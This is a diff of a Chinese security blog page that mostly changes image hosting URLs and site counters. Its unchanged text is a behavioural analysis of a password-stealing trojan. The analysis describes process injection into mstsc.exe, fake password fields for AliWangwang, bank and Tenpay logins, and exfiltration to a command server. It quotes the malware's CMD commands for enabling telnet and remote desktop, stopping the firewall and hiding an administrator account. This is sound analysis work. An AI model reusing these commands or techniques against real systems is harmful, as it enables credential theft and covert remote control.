@@ -52,20 +52,20 @@
 <meta property="og:description" content="多功能盗号木马行为分析
 调试环境：Windows XP SP3, OD, IDA, 010Editor等
 病毒简介1 病毒运行后会两次注入到远程桌面进程中实现其主要功能，该功能会伪造假的用户密码输入框来获取用户密码信息，其中包括阿里，银行和财付通2 该病毒会释放一些旧版本的控件以及远程桌面链接dll文件，从而实现远程多用户登陆。3 母体实现的功能：将功能子体两次注入到mstsc.exe进程4 子体">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-1.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-2.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-3.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-4.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-5.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-6.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-7.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-8.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-9.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-10.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-11.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-12.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-13.png">
-<meta property="og:updated_time" content="2015-12-31T11:58:10.000Z">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-1.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-2.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-3.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-4.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-5.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-6.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-7.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-8.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-9.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-10.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-11.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-12.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-13.png">
+<meta property="og:updated_time" content="2016-07-07T14:25:09.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="病毒分析-多功能盗号木马">
 <meta name="twitter:description" content="多功能盗号木马行为分析
@@ -425,12 +425,12 @@
 <h2 id="病毒母体运行流程">病毒母体运行流程</h2><p>0x1 通过函数FindFirstFileA找到母体同目录下的lin.dll文件，调用LoadLibraryA函数将其加载，如果找不到，会弹出“缺少文件请解压完全”提示框。</p>
 <p>0x2 通过函数GetProcAddress获取lin.dll文件中函数子程序1地址，之后跳入子程序1函数执行</p>
 <p>0x3 释放运行所需的文件<br>1通过FindFirstFileA查找文件”C:\Program Files\security\servisc.exe”如果文件不存在则释放。<br>2调用CreateDirectoryA生成目录”C:\Program Files\security”，在该目录下依次释放6个文件。<br>3释放 servise.exe文件，从偏移0x6446B写入0x72180字节数据<br>4释放msvcr100.dll，从偏移0xd6600写入0xbcf50字节数据<br>5释放msvcp100.dll，从偏移0x193565写入0x66D50字节数据<br>6释放dxy.dat，从偏移0x1fc2d5写入0x11d726字节数据<br>7释放dxy2.dat，从偏移0x3179fc写入0x48FA6字节数据<br>8释放crt.dll 偏移0x3609b2写入0x42738字节数据<br>9将同目录的version.ini文件拷贝到C:\Program Files\security目录下</p>
-<p>0x4 生成快捷图标加如开始启动项<br>1将C:\Program Files\security\servisc.exe创建快捷方式，命名为系统漏洞修复<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-1.png" alt=""><br>2将该快捷方式拷贝到目录C:\Documents and Settings\Admin\「开始」菜单\程序\启动</p>
-<p>0x5运行主要注入功能DLL文件crt.dll<br>1创建进程C:\Program Files\security\servisc.exe<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-2.png" alt=""><br>2该文件servisc.exe为具有数字签名的正常暴风影音业务组件，该文件运行时会自动加载同目录下的三个dll文件，分别为crt.dll，MSVCP100.dll和MSVCR100.dll<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-3.png" alt=""><br>3其中MSVCP100.dll和MSVCR100.dll为正常的dll文件，crt.dll为病毒主要功能dll，用来注入进程。</p>
-<p>0x6 之后制造虚假弹窗，进程退出，后台自动完成注入功能<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-4.png" alt=""></p>
+<p>0x4 生成快捷图标加如开始启动项<br>1将C:\Program Files\security\servisc.exe创建快捷方式，命名为系统漏洞修复<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-1.png" alt=""><br>2将该快捷方式拷贝到目录C:\Documents and Settings\Admin\「开始」菜单\程序\启动</p>
+<p>0x5运行主要注入功能DLL文件crt.dll<br>1创建进程C:\Program Files\security\servisc.exe<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-2.png" alt=""><br>2该文件servisc.exe为具有数字签名的正常暴风影音业务组件，该文件运行时会自动加载同目录下的三个dll文件，分别为crt.dll，MSVCP100.dll和MSVCR100.dll<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-3.png" alt=""><br>3其中MSVCP100.dll和MSVCR100.dll为正常的dll文件，crt.dll为病毒主要功能dll，用来注入进程。</p>
+<p>0x6 之后制造虚假弹窗，进程退出，后台自动完成注入功能<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-4.png" alt=""></p>
 <h2 id="子体Crt-dll注入功能">子体Crt.dll注入功能</h2><p>0x1 将dxy2.dat文件拷贝到内存，验证头四个字节是否为33E0F0Dh</p>
 <p>0x2 从dxy2.dat偏移0x4处获取解密文件大小0x99000，申请内存将解密出的dxy2.dat写入内存</p>
-<p>0x3 将dxy2.dat注入远程桌面进程mstsc.exe<br>1创建远程桌面进程c:\windows\system32\mstsc.exe，将该线程挂起<br>2定义一个CONTEXT 结构变量，将其ContextFlags 初始CONTEXT_INTEGER<br>3使用GetThreadContext 取得上下文（寄存器的值）。<br>4 Context结构中偏移+0xA4处存放着EBX的值，该值为目标进程PEB结构起始地址，偏移+0xB0存放着EAX值，该值为目标进程OEP，即：<br>GetThreadContext(pi.hThread,&amp;ThreadCxt);<br>PEB addr = ThreadCxt.Ebx ;<br>OEP add = ThreadCxt.Eax;<br>5 获取PEB结构偏移+0x8地址，该地址存放着目标进程的映像基址。<br>6调用VirtualAllocEx在目标进程中申请空间<br>7调用ZwWriteVirtualMemory将解密出来的dxy2.dat按照PE格式写入进程mstsc.exe中<br>8最后在7FFD3008处（PEB结构偏移+0x8目标进程的映像基址）写入注入进程基址0x400000<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-5.png" alt=""><br>9获取注入进程的OEP，修改寄存器eax值为注入进程的OEP。<br>10用SetThreadContext 更新系统中线程的上下文。<br>11调用ZwResumeThread恢复目标进程去执行自己注入的进程dxy2.dat<br>调用ZwGetContextThread和ZwSetContextThread修改目标进程线程执行位置[D1] </p>
+<p>0x3 将dxy2.dat注入远程桌面进程mstsc.exe<br>1创建远程桌面进程c:\windows\system32\mstsc.exe，将该线程挂起<br>2定义一个CONTEXT 结构变量，将其ContextFlags 初始CONTEXT_INTEGER<br>3使用GetThreadContext 取得上下文（寄存器的值）。<br>4 Context结构中偏移+0xA4处存放着EBX的值，该值为目标进程PEB结构起始地址，偏移+0xB0存放着EAX值，该值为目标进程OEP，即：<br>GetThreadContext(pi.hThread,&amp;ThreadCxt);<br>PEB addr = ThreadCxt.Ebx ;<br>OEP add = ThreadCxt.Eax;<br>5 获取PEB结构偏移+0x8地址，该地址存放着目标进程的映像基址。<br>6调用VirtualAllocEx在目标进程中申请空间<br>7调用ZwWriteVirtualMemory将解密出来的dxy2.dat按照PE格式写入进程mstsc.exe中<br>8最后在7FFD3008处（PEB结构偏移+0x8目标进程的映像基址）写入注入进程基址0x400000<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-5.png" alt=""><br>9获取注入进程的OEP，修改寄存器eax值为注入进程的OEP。<br>10用SetThreadContext 更新系统中线程的上下文。<br>11调用ZwResumeThread恢复目标进程去执行自己注入的进程dxy2.dat<br>调用ZwGetContextThread和ZwSetContextThread修改目标进程线程执行位置[D1] </p>
 <h2 id="子体Dxy2-exe远控功能">子体Dxy2.exe远控功能</h2><p>0x1 生成两个线程用于远程监控桌面和声音</p>
 <p>0x2解析域名168la.net返回IP地址生成3个URL：</p>
 <pre><code><span class="string">http:</span><span class="comment">//IP:1111/dxymd5.txt</span>
@@ -441,8 +441,8 @@
 <h2 id="子体Dxy-exe盗号功能">子体Dxy.exe盗号功能</h2><h3 id="创建线程0x402BFF杀掉aliimsafe-exe进程">创建线程0x402BFF杀掉aliimsafe.exe进程</h3><p>1 通过函数CreateToolhelp32Snapshot创建快照，调用函数Process32First和Process32Next循环遍历进程找到aliimsafe.exe进程。<br>2调用TerminateProcess将进程结束。</p>
 <h3 id="获取系统信息加密储存">获取系统信息加密储存</h3><p>1读取配置文件C:\Program Files\security\version.ini验证是否为t1<br>2 通过GetComputerNameA获取计算机名字，<br>加密写入C:\WINDOWS\system32\备注xa.txt<br>调用GetSystemTime获取当前系统时间，<br>加密写入C:\WINDOWS\system32\time3321</p>
 <h3 id="创建线程0x410362建立远程链接">创建线程0x410362建立远程链接</h3><p>解析域名www.168la.net得到IP与1720端口建立链接，用于通信和远程控制，该功能在后边描述。</p>
-<h3 id="创建线程0x410BAE获取阿里旺旺账户密码">创建线程0x410BAE获取阿里旺旺账户密码</h3><p>1调用GetCursorPos不停的捕获光标设置，通过WindowFromPoint获取窗口句柄，通过GetClassName获取窗口类名<br>2 检测该窗口是否存在ATL:Edit控件，该控件为阿里旺旺密码输入框控件，如果存在则通过GetWindowsThreadProcessID获取进程ID并通过GetModuleFileNameExA获取进程名。<br>3 检测该进程是否为AliIM.exe，如果是则检测窗口名是否为“阿里旺旺”<br>4 如果为阿里旺旺窗口则重新绘制一个假的ATL:Edit密码输入框将原来的覆盖，<br>并清空原来控件上已经存在的密码信息。<br>5当用户输入密码以后就将其捕获，并将输入的密码同步到原始登陆窗的ATL:Edit控件中。<br>6如果进程不为 AliIM.exe则判断是否为银行，之后用相同的办法获取银行密码信息。[D2]<br>7当控件焦点失去即用户输入完密码点登陆之后，会触发消息响应事件CUEdit::OnKillfocus进入到处理流程.<br>8先解密出之前记录在C:\windows\system32\logxa.txt中的登陆信息和密码<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-6.png" alt=""><br>9 获取之前登陆的密码4141414141414141与当前输入的对比（比如当前输入的是4242424242424242）如果相等则不改变<br>10如果不相等，则获取当前系统时间，获取“编辑框_伪装”的数据即伪造的密码登陆框数据，按照格式写在原始密码之后<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-7.png" alt=""><br>11加密，写入logxa.txt文件中。</p>
-<h3 id="创建线程0x410C60替换qqedit-dll获取财付通密码">创建线程0x410C60替换qqedit.dll获取财付通密码</h3><p>1删除C:\Program Files\Tencent\Common Files\tencent\paycenter目录下qqedit.dll<br>2如果系统为64位还需删除C:\Program Files（x86）\Tencent\Common Files\tencent\paycenter目录下qqedit.dll<br>3 qqedit.dll为财付通安全控件，该控件保证用户在输入密码时候进入安全模式，不会被电脑记录按键位置。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-8.png" alt=""><br>4然后在同目录下释放1.2.0.6版本的qqedit.dll，将文件偏移0x2229DF处0x27778字节写入。<br>5 经测试，释放的1.2.0.6版本的qqedit.dll并没有屏蔽键盘输入记录，可被键盘记录软件记录下来。<br>6当用户填写支付密码时候，光标会处于财付通页面的ATL:Edit控件，之后用盗取阿里旺旺密码相同的方式在支付密码窗口绘制一个新的输入框。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-9.png" alt=""><br>7 按照获取阿里旺旺登陆密码的方式获取财付通密码<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-10.png" alt=""><br>8加密写入logxa.txt</p>
+<h3 id="创建线程0x410BAE获取阿里旺旺账户密码">创建线程0x410BAE获取阿里旺旺账户密码</h3><p>1调用GetCursorPos不停的捕获光标设置，通过WindowFromPoint获取窗口句柄，通过GetClassName获取窗口类名<br>2 检测该窗口是否存在ATL:Edit控件，该控件为阿里旺旺密码输入框控件，如果存在则通过GetWindowsThreadProcessID获取进程ID并通过GetModuleFileNameExA获取进程名。<br>3 检测该进程是否为AliIM.exe，如果是则检测窗口名是否为“阿里旺旺”<br>4 如果为阿里旺旺窗口则重新绘制一个假的ATL:Edit密码输入框将原来的覆盖，<br>并清空原来控件上已经存在的密码信息。<br>5当用户输入密码以后就将其捕获，并将输入的密码同步到原始登陆窗的ATL:Edit控件中。<br>6如果进程不为 AliIM.exe则判断是否为银行，之后用相同的办法获取银行密码信息。[D2]<br>7当控件焦点失去即用户输入完密码点登陆之后，会触发消息响应事件CUEdit::OnKillfocus进入到处理流程.<br>8先解密出之前记录在C:\windows\system32\logxa.txt中的登陆信息和密码<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-6.png" alt=""><br>9 获取之前登陆的密码4141414141414141与当前输入的对比（比如当前输入的是4242424242424242）如果相等则不改变<br>10如果不相等，则获取当前系统时间，获取“编辑框_伪装”的数据即伪造的密码登陆框数据，按照格式写在原始密码之后<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-7.png" alt=""><br>11加密，写入logxa.txt文件中。</p>
+<h3 id="创建线程0x410C60替换qqedit-dll获取财付通密码">创建线程0x410C60替换qqedit.dll获取财付通密码</h3><p>1删除C:\Program Files\Tencent\Common Files\tencent\paycenter目录下qqedit.dll<br>2如果系统为64位还需删除C:\Program Files（x86）\Tencent\Common Files\tencent\paycenter目录下qqedit.dll<br>3 qqedit.dll为财付通安全控件，该控件保证用户在输入密码时候进入安全模式，不会被电脑记录按键位置。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-8.png" alt=""><br>4然后在同目录下释放1.2.0.6版本的qqedit.dll，将文件偏移0x2229DF处0x27778字节写入。<br>5 经测试，释放的1.2.0.6版本的qqedit.dll并没有屏蔽键盘输入记录，可被键盘记录软件记录下来。<br>6当用户填写支付密码时候，光标会处于财付通页面的ATL:Edit控件，之后用盗取阿里旺旺密码相同的方式在支付密码窗口绘制一个新的输入框。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-9.png" alt=""><br>7 按照获取阿里旺旺登陆密码的方式获取财付通密码<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-10.png" alt=""><br>8加密写入logxa.txt</p>
 <h3 id="主要盗号功能">主要盗号功能</h3><p>与www.168la.net:1720建立通信以后实现的功能。<br>该功能模块循环获取系统信息，盗取系统账户密码加密写入文件，最后读取所有文件信息发送给目标。</p>
 <h4 id="远程截屏">远程截屏</h4><p>1通过GetSystemMetrics获取屏幕的分辨率<br>2通过CreateCompatibleDC，CreateCompatibleBitmap，BitBlt获取屏幕位图信息<br>3通过CreatePalette，CreateCompatibleBitmap，StretchBlt等函数实现绘图<br>4 转成数据格式发送</p>
 <h4 id="远程截取指定窗口">远程截取指定窗口</h4><p>1通过FindWindowsExA获取指定窗口<br>2通过GetWindowsRect返回指定窗口的边框矩形的尺寸<br>3通过GetDC，CreateCompatibleDC，CreateCompatibleBitmap，PrintWindow，GetDIBits等函数绘制窗口<br>4转成数据格式发送</p>
@@ -463,7 +463,7 @@ CMD /C REG ADD "HKLM<span class="command">\SOFTWARE</span><span class="command">
 </span><span class="built_in">CMD</span> <span class="bash">/C sc config MpsSvc start= auto
 </span><span class="built_in">CMD</span> <span class="bash">/C sc start MpsSvc</span>
 </code></pre><p>6将新的用户名和系统时间加密写入备份xa文件和time3321文件</p>
-<h4 id="开启远程桌面链接服务,实现多用户登陆">开启远程桌面链接服务,实现多用户登陆</h4><p>1遍历进程找到AliimSafe.exe将其结束<br>2取路径C:/Documents and Settings/当前用户/Templates，在该目录下生成重定向.reg文件，写入重定向数据，然后调用CreateProcess运行将该信息导入到注册表注册表MACHINE\SYSTEM\ControlSet001\Enum\Root\RDPDR<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-11.png" alt=""><br>3通过CMD命令开启远程桌面服务，并设置为自启动。</p>
+<h4 id="开启远程桌面链接服务,实现多用户登陆">开启远程桌面链接服务,实现多用户登陆</h4><p>1遍历进程找到AliimSafe.exe将其结束<br>2取路径C:/Documents and Settings/当前用户/Templates，在该目录下生成重定向.reg文件，写入重定向数据，然后调用CreateProcess运行将该信息导入到注册表注册表MACHINE\SYSTEM\ControlSet001\Enum\Root\RDPDR<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-11.png" alt=""><br>3通过CMD命令开启远程桌面服务，并设置为自启动。</p>
 <pre><code><span class="built_in">CMD</span> <span class="bash">/C sc config tlntsvr start= auto  //基于TCP/IP网络的终端程序
 </span><span class="built_in">CMD</span> <span class="bash">/C sc start Telnet
 </span><span class="built_in">CMD</span> <span class="bash">/C sc config rdsessmgr start= auto   //打开远程桌面协助服务
@@ -474,7 +474,7 @@ CMD /C REG ADD "HKLM<span class="command">\SOFTWARE</span><span class="command">
 </span><span class="built_in">CMD</span> <span class="bash">/C sc start Dcomlaunch
 </span><span class="built_in">CMD</span> <span class="bash">/C sc config winmgmt start= auto   //用于系统管理员创建WIndows管理脚本
 </span><span class="built_in">CMD</span> <span class="bash">/C sc start winmgmt</span>
-</code></pre><p>4通过cmd /c Tasklist/SVC &gt;&gt;命令将当前所有进程以及进程中加载的服务项保存到临时文件夹tmp155.txt中<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-12.png" alt=""><br>5查找是否存在dcomlaunch服务项，如果存在找到加载该服务对应的进程ID调用taskkill /pid命令将其结束。<br>6如果这个时候提示关机倒计时则调用cmd命令shutdown –a将其取消<br>7删除注册表：</p>
+</code></pre><p>4通过cmd /c Tasklist/SVC &gt;&gt;命令将当前所有进程以及进程中加载的服务项保存到临时文件夹tmp155.txt中<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-12.png" alt=""><br>5查找是否存在dcomlaunch服务项，如果存在找到加载该服务对应的进程ID调用taskkill /pid命令将其结束。<br>6如果这个时候提示关机倒计时则调用cmd命令shutdown –a将其取消<br>7删除注册表：</p>
 <pre><code>SOFTWARE<span class="command">\Policies</span><span class="command">\Microsoft</span><span class="command">\Windows</span> NT<span class="command">\Terminal</span> Services<span class="command">\MaxInstanceCount</span>//服务器系统的并发连接数量进行控制
 Software<span class="command">\Microsoft</span><span class="command">\Windows</span><span class="command">\CurrentVersion</span><span class="command">\Run</span><span class="command">\aliim</span>//删除阿里旺旺自启动
 </code></pre><p>8修改注册表保证切换用户时不会断开网络连接</p>
@@ -493,7 +493,7 @@ net <span class="built_in">start</span> termservice  <span class="comment"> //�
 net <span class="built_in">stop</span> sharedaccess
 </code></pre><p>至此实现了远程多用户登陆，在不影响目标主机正常使用的的前提下，使用新的账户administratvr账户远程登陆到目标主机，实现远程控制。</p>
 <h4 id="检测登陆当前登陆用户，隐藏自身账户">检测登陆当前登陆用户，隐藏自身账户</h4><p>1 检测当前登陆用户，如果不是administrator则通过注册表将账户隐藏<br>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>\SpecialAccounts\UserList” /v administrator /t reg_dword /d 0 /f<br>2提升进程权限<br>3调用函数SetSystemPowerState是计算机进入休眠状态<br>4 用户会重新用administrator账户登陆</p>
-<h4 id="发送信息到服务器">发送信息到服务器</h4><p>最后从备注xa.txt，logxa.txt和time3321解密出计算机名和系统时间以及获取的用户密码，发送到目标服务器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-13.png" alt=""><br>其中备注xa.txt中记录这是否获取淘宝等账户密码，qt1表示获取到了淘宝密码。</p>
+<h4 id="发送信息到服务器">发送信息到服务器</h4><p>最后从备注xa.txt，logxa.txt和time3321解密出计算机名和系统时间以及获取的用户密码，发送到目标服务器<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-troj-mutil-13.png" alt=""><br>其中备注xa.txt中记录这是否获取淘宝等账户密码，qt1表示获取到了淘宝密码。</p>
 </span>
       
     </div>
@@ -726,7 +726,7 @@ net <span class="built_in">stop</span> sharedaccess
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">56</span>
+              <span class="site-state-item-count">58</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -740,7 +740,7 @@ net <span class="built_in">stop</span> sharedaccess
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">30</span>
+              <span class="site-state-item-count">31</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
